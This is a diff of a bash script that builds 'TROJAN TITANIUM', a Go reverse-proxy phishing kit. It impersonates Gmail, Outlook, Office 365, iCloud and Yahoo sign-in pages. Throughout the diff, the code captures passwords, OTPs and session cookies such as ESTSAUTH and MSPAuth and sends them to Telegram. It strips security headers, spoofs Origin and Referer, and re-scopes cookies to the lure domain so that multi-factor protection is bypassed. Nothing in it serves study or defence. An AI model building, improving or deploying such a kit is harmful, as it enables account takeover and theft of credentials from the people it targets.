@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJAN - TITANIUM V18.9 - CONTENT-LENGTH VALIDATED
+# 🏛️ TROJAN - TITANIUM V19.0 - AIRTIGHT MULTI-LURE FIX
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -72,10 +72,10 @@ while true; do
     fi
 done
 
-# --- 6. SELF-HEALING ENGINE (AIRTIGHT HOST-ENFORCEMENT) ---
-echo -e "${CYAN}[...] Rebuilding Airtight Proxy Engine...${NC}"
+# --- 6. SELF-HEALING ENGINE (REINFORCED PROXY) ---
+echo -e "${CYAN}[...] Rebuilding Smart Proxy Engine...${NC}"
 
-# A. main.go (SSL for all 7 Lures)
+# A. main.go
 cat << EOF > /root/TrojanProject/main.go
 package main
 import (
@@ -85,7 +85,7 @@ import (
 )
 func main() {
 	base := "$USER_DOMAIN"
-	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v18.9\033[0m")
+	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v19.0\033[0m")
 	certmagic.DefaultACME.Agreed = true
 	certmagic.DefaultACME.Email = "admin@" + base
 	mux := http.NewServeMux()
@@ -99,7 +99,7 @@ func main() {
 }
 EOF
 
-# B. proxy.go (Airtight Host-Enforcement with Content-Length Validator)
+# B. proxy.go (Cookie Re-Scoper & Header Spoofing)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 import (
@@ -116,49 +116,53 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	proxy := httputil.NewSingleHostReverseProxy(remote)
 	myHost := r.Host 
 
+	// 🛡️ HEADER SPOOFING: Strip Origin/Referer to bypass security checks
 	r.Host = remote.Host
 	r.URL.Host = remote.Host
 	r.URL.Scheme = remote.Scheme
+	r.Header.Del("Origin")
+	r.Header.Del("Referer")
 	r.Header.Set("X-Forwarded-Host", myHost)
-	r.Header.Set("X-Real-IP", r.RemoteAddr)
 
 	if r.Method == "POST" {
 		body, _ := io.ReadAll(r.Body)
 		r.Body = io.NopCloser(bytes.NewBuffer(body))
 		bodyStr := string(body)
-		if strings.Contains(bodyStr, "passwd") || strings.Contains(bodyStr, "login") || strings.Contains(bodyStr, "otp") {
-			SendToTelegram(fmt.Sprintf("🔓 [LOGIN] %s\nData: %s", t.Name, bodyStr))
+		if strings.Contains(bodyStr, "pass") || strings.Contains(bodyStr, "login") || strings.Contains(bodyStr, "otp") {
+			SendToTelegram(fmt.Sprintf("🔓 [DATA] %s\nTarget: %s\nBody: %s", t.Name, myHost, bodyStr))
 		}
 	}
 
 	proxy.ModifyResponse = func(resp *http.Response) error {
-		for header, values := range resp.Header {
-			for i, v := range values {
-				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
-					resp.Header[header][i] = strings.ReplaceAll(v, t.BaseDomain, myHost)
-				}
-				if strings.Contains(v, "login.microsoftonline.com") {
-					resp.Header[header][i] = strings.ReplaceAll(v, "login.microsoftonline.com", myHost)
-				}
-			}
-		}
+		// 1. RE-SCOPE COOKIES: Force browser to accept them for YOUR domain
+		oldCookies := resp.Cookies()
+		resp.Header.Del("Set-Cookie")
+		for _, c := range oldCookies {
+			c.Domain = myHost // Point cookie to your lure domain
+			http.SetCookie(w, c)
 
-		for _, c := range resp.Cookies() {
 			for _, auth := range t.AuthCookies {
 				if strings.Contains(c.Name, auth) {
 					SendToTelegram(fmt.Sprintf("🎯 [%s] SUCCESS! %s=%s", t.Name, c.Name, c.Value))
 					resp.Header.Set("Location", "https://www.google.com/docs/about/")
 					resp.StatusCode = 302
-					return nil
+				}
+			}
+		}
+
+		// 2. HEADER SWEEP
+		for header, values := range resp.Header {
+			for i, v := range values {
+				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
+					resp.Header[header][i] = strings.ReplaceAll(v, t.BaseDomain, myHost)
 				}
 			}
 		}
 
 		resp.Header.Del("Content-Security-Policy")
 		resp.Header.Del("X-Frame-Options")
-		resp.Header.Del("X-Content-Type-Options")
-		resp.Header.Del("Strict-Transport-Security")
 
+		// 3. BODY REWRITE & CONTENT-LENGTH VALIDATOR
 		contentType := resp.Header.Get("Content-Type")
 		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
 			oldBody, _ := io.ReadAll(resp.Body)
@@ -166,9 +170,8 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			
 			newContent := strings.ReplaceAll(bodyStr, t.BaseDomain, myHost)
 			newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
-			newContent = strings.ReplaceAll(newContent, "www.icloud.com", myHost)
+			newContent = strings.ReplaceAll(newContent, "login.live.com", myHost)
 			
-			// --- CONTENT-LENGTH VALIDATOR ---
 			bodyBytes := []byte(newContent)
 			resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
 			resp.ContentLength = int64(len(bodyBytes))
@@ -180,7 +183,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 }
 EOF
 
-# C. targets.go
+# C. targets.go (Corrected endpoints for Outlook/iCloud)
 cat << 'EOF' > /root/TrojanProject/targets.go
 package main
 import "strings"
@@ -189,7 +192,7 @@ func GetTargetConfig(host string) *Target {
 	host = strings.ToLower(host)
 	targets := map[string]*Target{
 		"gmail":   {"Gmail", "accounts.google.com", []string{"SID", "HSID", "SSID"}},
-		"outlook": {"Outlook", "login.live.com", []string{"MSPAuth"}},
+		"outlook": {"Outlook", "login.live.com", []string{"MSPAuth", "MSPCore"}},
 		"office":  {"Office", "login.microsoftonline.com", []string{"ESTSAUTH"}},
 		"icloud":  {"iCloud", "www.icloud.com", []string{"session_token"}},
 		"yahoo":   {"Yahoo", "login.yahoo.com", []string{"B", "T"}},
